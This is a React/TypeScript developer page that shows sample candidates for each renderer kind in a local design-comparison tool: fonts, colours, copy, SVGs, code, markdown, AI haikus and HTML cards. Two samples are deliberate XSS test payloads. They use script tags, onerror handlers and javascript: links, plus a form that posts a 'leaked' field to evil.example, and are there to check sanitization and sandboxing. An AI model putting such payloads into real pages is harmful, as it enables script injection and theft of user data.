import { KindRenderer } from '../components/KindRenderer';
import { allKinds } from '../lib/kinds/registry';
import type { TypographyCandidate } from '../lib/kinds/typography';
import { CONTENT } from '../lib/kinds/typography/content';
import type { ColorCandidate } from '../lib/kinds/color';
import type { CopyCandidate } from '../lib/kinds/copy';
import type { ImagesCandidate } from '../lib/kinds/images';
import type { CodeCandidate } from '../lib/kinds/code';
import type { MarkdownCandidate } from '../lib/kinds/markdown';
import type { AiOutputCandidate } from '../lib/kinds/ai-output';
import type { FreeformCandidate } from '../lib/kinds/freeform';
import type { CandidateBase, KindId } from '../lib/kinds/types';

const TYPOGRAPHY_SAMPLES: TypographyCandidate[] = [
  { id: 'newsreader-inter', label: 'Newsreader + Inter', serif: 'newsreader', sans: 'inter' },
  { id: 'lora-hanken', label: 'Lora + Hanken Grotesk', serif: 'lora', sans: 'hanken-grotesk' },
  { id: 'plex', label: 'IBM Plex Serif + Plex Sans', serif: 'ibm-plex-serif', sans: 'ibm-plex-sans' },
];

const COLOR_SAMPLES: ColorCandidate[] = [
  { id: 'graphite', label: 'Graphite', hex: '#111111', name: 'Graphite' },
  { id: 'paper', label: 'Paper', hex: '#f4f4f4', name: 'Paper' },
  { id: 'azure', label: 'Azure', hex: '#2563eb', name: 'Azure' },
  { id: 'ember', label: 'Ember', hex: '#d97706', name: 'Ember' },
  { id: 'leaf', label: 'Leaf', hex: '#15803d', name: 'Leaf' },
];

const COPY_SAMPLES: CopyCandidate[] = [
  { id: 'headline', label: 'Headline', text: 'Beslutninger der bevæger sig hurtigere end tvivlen.' },
  {
    id: 'paragraph',
    label: 'Paragraph',
    text: 'Tournaments er et lokalt-først værktøj til at sammenligne kandidater — fonte, farver, copy, billeder — ved hjælp af stringente bedømmelsesmetodikker. Ingen sky, ingen telemetri, ingen kompromiser.',
  },
  { id: 'cta', label: 'CTA', text: 'Start tournament' },
];

const IMAGE_SAMPLES: ImagesCandidate[] = [
  {
    id: 'svg-square',
    label: 'Block — solid',
    src:
      'data:image/svg+xml;utf8,' +
      encodeURIComponent(
        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 150"><rect width="200" height="150" fill="#111"/><rect x="50" y="35" width="100" height="80" fill="#f2f2f2"/></svg>'
      ),
  },
  {
    id: 'svg-circle',
    label: 'Circle — accent',
    src:
      'data:image/svg+xml;utf8,' +
      encodeURIComponent(
        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 150"><rect width="200" height="150" fill="#f4f4f4"/><circle cx="100" cy="75" r="48" fill="#2563eb"/></svg>'
      ),
  },
  {
    id: 'svg-stack',
    label: 'Stack — striped',
    src:
      'data:image/svg+xml;utf8,' +
      encodeURIComponent(
        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 150"><rect width="200" height="150" fill="#fff7ed"/><rect x="20" y="30" width="160" height="14" fill="#d97706"/><rect x="20" y="58" width="160" height="14" fill="#15803d"/><rect x="20" y="86" width="160" height="14" fill="#2563eb"/><rect x="20" y="114" width="160" height="14" fill="#111111"/></svg>'
      ),
  },
];

const CODE_SAMPLES: CodeCandidate[] = [
  {
    id: 'ts-reducer',
    label: 'TypeScript — reducer',
    language: 'typescript',
    code: `type State = { count: number };
type Action = { type: 'inc' } | { type: 'dec' } | { type: 'reset' };

export function reducer(state: State, action: Action): State {
  switch (action.type) {
    case 'inc':   return { count: state.count + 1 };
    case 'dec':   return { count: state.count - 1 };
    case 'reset': return { count: 0 };
  }
}`,
  },
  {
    id: 'py-elo',
    label: 'Python — Elo update',
    language: 'python',
    code: `def update_elo(a: float, b: float, score_a: float, k: float = 24) -> tuple[float, float]:
    """Score: 1 means A beat B, 0 means B beat A, 0.5 means draw."""
    expected_a = 1.0 / (1.0 + 10 ** ((b - a) / 400))
    delta = k * (score_a - expected_a)
    return a + delta, b - delta`,
  },
  {
    id: 'bash-script',
    label: 'Bash — port discovery',
    language: 'bash',
    code: `#!/usr/bin/env bash
set -euo pipefail

PORT_FILE="$HOME/Library/Logs/Tournaments/server.port"
if [[ ! -f "$PORT_FILE" ]]; then
  echo "no running server" >&2
  exit 1
fi
PORT="$(cat "$PORT_FILE")"
curl -fsS "http://localhost:\${PORT}/api/registry"`,
  },
];

const MARKDOWN_SAMPLES: MarkdownCandidate[] = [
  {
    id: 'plan-a',
    label: 'Plan A — phased rollout',
    markdown: `# Plan A — phased rollout

We ship the **Elo pairwise** path first because it's the closest match to the
typography tournament that already exists.

## Phases

1. Lift the four kind renderers (this step).
2. Wire methodology adapters.
3. Migrate the seed typography tournament into the new shell.

## Risk

> The math is sound but the matchmaking heuristics are tuned for typography
> specifically. We'll need to re-evaluate fatigue thresholds per kind.

\`\`\`ts
const K = comparisons < 30 ? 40 : comparisons < 80 ? 24 : 16;
\`\`\`
`,
  },
  {
    id: 'plan-b',
    label: 'Plan B — bracket first',
    markdown: `# Plan B — bracket first

Start with **bracket-4-seed** because it has the smallest surface area and
forces the kind/methodology decoupling to be real.

- Four candidates exactly
- Three battles total (SF/SF/F)
- No rating math, no convergence problem
- Methodology UI is just three screens

Trade-off: Elo support slips by ~one phase, but the *architecture* gets
proven earlier against the easier methodology.

| methodology | candidates | comparisons |
|---|---|---|
| bracket-4-seed | 4 | 3 |
| elo-pairwise | 8+ | ~30+ |
`,
  },
  {
    id: 'plan-evil',
    label: 'Markdown — XSS attempt (should be defanged)',
    markdown: `# Sanitization check

Inline HTML below should be stripped:

<script>alert('xss-from-markdown')</script>

<img src="x" onerror="alert('xss-onerror')" />

<iframe src="https://example.com"></iframe>

[Click me](javascript:alert('xss-href'))

Plain markdown still renders: **bold**, *italic*, \`code\`.
`,
  },
];

const AI_OUTPUT_SAMPLES: AiOutputCandidate[] = [
  {
    id: 'opus-poem',
    label: 'Opus 4.7 — haiku',
    model: 'claude-opus-4-7',
    prompt: 'Write a haiku about Elo ratings.',
    response:
      'Numbers shift on win—\ntwo strangers crossing the board,\nrank, but not the truth.',
  },
  {
    id: 'sonnet-poem',
    label: 'Sonnet 4.6 — haiku',
    model: 'claude-sonnet-4-6',
    prompt: 'Write a haiku about Elo ratings.',
    response:
      'A point gained, lost—\nthe ladder forgets which game\nyou won at midnight.',
  },
  {
    id: 'no-prompt',
    label: 'Response only — no prompt',
    response:
      'The Elo system is robust to draws but assumes ratings are roughly stationary across the period being measured. If skill itself drifts, the K-factor needs to track that drift or estimates lag the true level.',
  },
];

const FREEFORM_SAMPLES: FreeformCandidate[] = [
  {
    id: 'card',
    label: 'Card — gradient',
    html:
      '<div style="background:linear-gradient(135deg,#2563eb,#7c3aed);color:white;padding:32px;border-radius:12px;font-family:-apple-system,Helvetica,sans-serif;">' +
      '<div style="font-size:11px;letter-spacing:0.12em;opacity:0.7;text-transform:uppercase;margin-bottom:8px;">candidate</div>' +
      '<div style="font-size:28px;font-weight:600;letter-spacing:-0.015em;">Freeform card sample</div>' +
      '<div style="margin-top:16px;font-size:14px;opacity:0.85;">Plain HTML composed into a card — useful when none of the other kinds fit cleanly.</div>' +
      '</div>',
  },
  {
    id: 'svg-illustration',
    label: 'SVG — illustration',
    html:
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 120" width="100%" height="auto">' +
      '<defs><linearGradient id="g" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#15803d"/><stop offset="1" stop-color="#0e7490"/></linearGradient></defs>' +
      '<rect width="200" height="120" fill="#f4f4f4"/>' +
      '<rect x="20" y="20" width="160" height="80" rx="10" fill="url(#g)"/>' +
      '<text x="100" y="68" text-anchor="middle" font-family="Helvetica" font-size="18" fill="white" font-weight="600">Inline SVG</text>' +
      '</svg>',
  },
  {
    id: 'xss-attempt',
    label: 'XSS attempt — must NOT execute',
    html:
      '<div style="padding:12px;border:1px dashed #d97706;border-radius:8px;font-family:-apple-system,Helvetica,sans-serif;">' +
      '<div style="font-weight:600;margin-bottom:8px;">If the sandbox works, none of the JS below executes.</div>' +
      '<script>document.body.style.background="red";alert("xss-script")</script>' +
      '<img src="x" onerror="alert(\'xss-onerror\')" />' +
      '<a href="javascript:alert(\'xss-href\')">javascript: link</a>' +
      '<iframe src="https://example.com"></iframe>' +
      '<form action="https://evil.example" method="post"><input name="leaked" value="should not submit"><button type="submit">submit</button></form>' +
      '</div>',
  },
];

const SAMPLES: Record<KindId, CandidateBase[]> = {
  typography: TYPOGRAPHY_SAMPLES,
  color: COLOR_SAMPLES,
  copy: COPY_SAMPLES,
  images: IMAGE_SAMPLES,
  code: CODE_SAMPLES,
  markdown: MARKDOWN_SAMPLES,
  'ai-output': AI_OUTPUT_SAMPLES,
  freeform: FREEFORM_SAMPLES,
};

function contextFor(kindId: KindId, index: number): unknown {
  if (kindId === 'typography') {
    return { content: CONTENT[index % CONTENT.length] };
  }
  if (kindId === 'copy') {
    const roles: Array<'headline' | 'paragraph' | 'cta'> = ['headline', 'paragraph', 'cta'];
    return { role: roles[index] ?? undefined };
  }
  return undefined;
}

function KindSection({ kindId }: { kindId: KindId }) {
  const kind = allKinds().find((k) => k.id === kindId);
  if (!kind) return null;
  const samples = SAMPLES[kindId];

  return (
    <section className="border-t border-[var(--border)] py-12">
      <header className="mb-8 flex items-baseline justify-between gap-4">
        <h2 className="text-lg font-medium tracking-tight">{kind.displayName}</h2>
        <span className="text-xs uppercase tracking-wider text-[var(--text-faint)]">
          kind = {kind.id}
        </span>
      </header>
      <div className="flex flex-wrap items-start gap-12">
        {samples.map((candidate, i) => (
          <div key={candidate.id} className="flex flex-col gap-3">
            <div className="text-xs text-[var(--text-faint)]">
              {kind.summarize(candidate)}
            </div>
            <div
              style={{
                background: 'var(--bg-card)',
                border: '1px solid var(--border)',
                borderRadius: 10,
                padding: 24,
              }}
            >
              <KindRenderer kind={kindId} candidate={candidate} context={contextFor(kindId, i)} />
            </div>
          </div>
        ))}
      </div>
    </section>
  );
}

const ALL_KIND_IDS: KindId[] = [
  'typography',
  'color',
  'copy',
  'images',
  'code',
  'markdown',
  'ai-output',
  'freeform',
];

export default function KindsDevPage() {
  return (
    <main className="mx-auto max-w-6xl px-8 py-12">
      <header className="mb-6">
        <div className="text-xs uppercase tracking-wider text-[var(--text-faint)]">
          /dev/kinds
        </div>
        <h1 className="text-2xl font-semibold tracking-tight mt-1">Kind renderers</h1>
        <p className="mt-2 text-sm text-[var(--text-muted)]">
          Pure renderers for each implemented kind. No card chrome, no isolation, no comparison
          shell — those live in Phase 4. Every renderer is reached through the registry; nothing
          here imports a kind directly.
        </p>
      </header>
      {ALL_KIND_IDS.map((kindId) => (
        <KindSection key={kindId} kindId={kindId} />
      ))}
    </main>
  );
}
